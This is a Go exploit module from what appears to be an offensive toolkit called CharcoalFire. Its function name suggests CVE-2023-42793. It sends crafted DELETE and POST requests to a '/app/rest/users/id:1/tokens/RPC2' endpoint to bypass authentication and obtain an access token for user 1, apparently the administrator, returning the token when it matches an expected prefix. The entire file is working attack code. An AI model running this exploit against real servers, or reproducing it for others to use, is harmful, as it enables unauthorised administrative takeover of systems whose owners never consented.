package exp

import (
	"CharcoalFire/utils"
	"encoding/xml"
	"io/ioutil"
	"strings"
)

func V202342793(expParameter utils.ExpParameter) bool {
	token := DeleteUserToken(expParameter)
	if token != "" && token != "nook" {
		return true
	} else {
		return false
	}
}

func DeleteUserToken(expParameter utils.ExpParameter) string {
	ask := utils.Ask{
		Header: map[string]string{
			"Content-Type":    "application/x-www-form-urlencoded",
			"Accept-Encoding": "gzip, deflate",
		},
		Url:     expParameter.Url + "/app/rest/users/id:1/tokens/RPC2",
		Timeout: expParameter.Timeout,
		Proxy:   expParameter.Proxy,
		Method:  "DELETE",
	}
	resp := utils.OutsourcingByPwn(ask)
	if resp != nil {
		if resp.StatusCode == 204 || resp.StatusCode == 404 {
			token := CreateUserToken(expParameter)
			return token
		} else {
			return "nook"
		}
	} else {
		return "nook"
	}
}

type Response struct {
	Value string `xml:"value,attr"`
}

func CreateUserToken(expParameter utils.ExpParameter) string {
	ask := utils.Ask{
		Header: map[string]string{
			"Accept-Encoding": "gzip, deflate",
		},
		Url:     expParameter.Url + "/app/rest/users/id:1/tokens/RPC2",
		Method:  "POST",
		Timeout: expParameter.Timeout,
		Proxy:   expParameter.Proxy,
	}
	resp := utils.OutsourcingByPwn(ask)
	if resp.StatusCode == 200 {
		body, err := ioutil.ReadAll(resp.Body)
		var root Response
		err = xml.Unmarshal(body, &root)
		if err != nil {
			return "nook"
		}
		if strings.HasPrefix(root.Value, "eyJ0eXAiOiAiVENWMiJ9") {
			return root.Value
		} else {
			return "nook"
		}
	} else {
		return "nook"
	}
}
